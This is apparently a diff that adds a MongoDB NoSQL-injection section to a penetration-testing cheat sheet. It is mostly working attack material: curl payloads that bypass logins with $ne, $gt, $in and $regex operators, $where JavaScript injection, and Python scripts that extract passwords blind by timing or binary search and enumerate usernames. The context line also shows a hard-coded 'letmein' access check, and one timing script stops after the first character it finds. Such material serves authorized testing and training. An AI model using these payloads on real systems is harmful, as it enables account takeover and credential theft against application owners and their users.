@@ -121,22 +121,171 @@ const hasAccess = urlParams.get('access') === 'letmein' || window.overrideAccess
 
 ## NoSQL Injection (MongoDB)
 
+**Detection signals:**
+- Application uses MongoDB, CouchDB, Firebase, DynamoDB, or similar document store
+- Login fields accept JSON (Content-Type: application/json) — try `{"$gt": ""}`
+- Error messages mention MongoDB, Mongoose, collection names, or ObjectId format
+- `X-Powered-By: Express` with Node.js stack is common for MongoDB apps
+
+### Operator Injection via JSON Body (Auth Bypass)
+
+```bash
+# Most reliable: send operators as JSON object properties
+# If Content-Type is application/json, operators pass directly to DB
+
+# $ne (not equal) — login as any user
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
+
+# $gt (greater than) — works when comparing strings
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$gt": ""}, "password": {"$gt": ""}}'
+
+# $in (match any in array) — specify target email
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$in": ["admin@juice-sh.op", "admin@example.com"]}, "password": {"$ne": null}}'
+
+# $exists — login with any document that has an email field
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$exists": true}, "password": {"$gt": ""}}'
+
+# $regex — enumerate usernames matching pattern
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$regex": "^admin"}, "password": {"$ne": ""}}'
+```
+
+### Operator Injection via URL Parameters (GET requests)
+
+```bash
+# MongoDB Mongoose accepts [op] suffix in query strings
+# e.g. ?username[$ne]=x  →  { username: { $ne: 'x' } }
+
+curl "http://target/api/users?username[\$ne]=nonexistent"
+curl "http://target/api/users?role[\$ne]=user"
+curl "http://target/api/search?name[\$regex]=^admin"
+curl "http://target/api/users?id[\$gt]=0"
+```
+
+### $where JavaScript Injection (RCE risk)
+
+```bash
+# $where executes arbitrary JS in the MongoDB context
+# Available when MongoDB server-side JS is enabled (default pre-MongoDB 4.4)
+
+# Boolean bypass
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"$where": "1==1"}'
+
+# Data extraction via timing (blind)
+curl -s -X POST http://target/api/login \
+  -H "Content-Type: application/json" \
+  -d '{"$where": "this.username.match(/^a/) && sleep(3000)"}'
+
+# Username enumeration via $where regex timing
+python3 << 'EOF'
+import requests, time, string
+
+url = "http://target/api/login"
+known = ""
+for c in string.ascii_lowercase + string.digits:
+    payload = {"$where": f"this.username == 'admin' && this.password[0] == '{c}'"}
+    start = time.time()
+    r = requests.post(url, json=payload)
+    elapsed = time.time() - start
+    if elapsed > 1 or r.status_code != 401:
+        known += c
+        print(f"[+] char: {c} | known: {known}")
+        break
+EOF
+```
+
 ### Blind NoSQL with Binary Search
+
 ```python
-def extract_char(position, session):
+import requests
+
+def extract_char(position, session, url):
     low, high = 32, 126
     while low < high:
         mid = (low + high) // 2
         payload = f"' && this.password.charCodeAt({position}) > {mid} && 'a'=='a"
-        resp = session.post('/login', data={'username': payload, 'password': 'x'})
-        if "Something went wrong" in resp.text:
+        resp = session.post(url, data={'username': payload, 'password': 'x'})
+        if "Something went wrong" in resp.text or resp.status_code == 500:
             low = mid + 1
         else:
             high = mid
     return chr(low)
+
+def extract_password(url, max_len=32):
+    s = requests.Session()
+    password = ""
+    for i in range(max_len):
+        c = extract_char(i, s, url)
+        if ord(c) == 32:  # space = end
+            break
+        password += c
+        print(f"[*] {password}", end='\r')
+    return password
+
+print(extract_password("http://target/login"))
 ```
 
 **Why simple boolean injection fails:** App queries with injected `$where`, then checks if returned user's credentials match input exactly. `'||1==1||'` finds admin but fails the credential check.
+
+### MongoDB Regex Enumeration
+
+```python
+import requests, string
+
+def enumerate_users(url, token=None):
+    """Enumerate all usernames via MongoDB $regex injection"""
+    headers = {"Content-Type": "application/json"}
+    if token:
+        headers["Authorization"] = f"Bearer {token}"
+
+    chars = string.ascii_lowercase + string.ascii_uppercase + string.digits + "._-@"
+    found_users = []
+    prefixes = [""]  # start with empty prefix
+
+    while prefixes:
+        prefix = prefixes.pop(0)
+        extended = False
+        for c in chars:
+            pattern = f"^{prefix}{c}"
+            payload = {"email": {"$regex": pattern, "$options": "i"}}
+            r = requests.post(url, json=payload, headers=headers)
+            if r.status_code == 200:
+                new_prefix = prefix + c
+                # Test if this is a complete value (no more chars follow)
+                exact = requests.post(url, json={"email": {"$regex": f"^{new_prefix}$"}}, headers=headers)
+                if exact.status_code == 200:
+                    found_users.append(new_prefix)
+                    print(f"[FOUND] {new_prefix}")
+                prefixes.append(new_prefix)
+                extended = True
+    return found_users
+```
+
+### NoSQL in Different Content Types
+
+```bash
+# application/x-www-form-urlencoded with bracket notation
+curl -X POST http://target/login \
+  -d 'email[$ne]=x&password[$ne]=x'
+
+# application/json nested object
+curl -X POST http://target/login \
+  -H "Content-Type: application/json" \
+  -d '{"email": {"$ne": null}, "password": {"$ne": null}}'
+
+# Try both — Express apps often support both via body-parser
+```
 
 ---
 
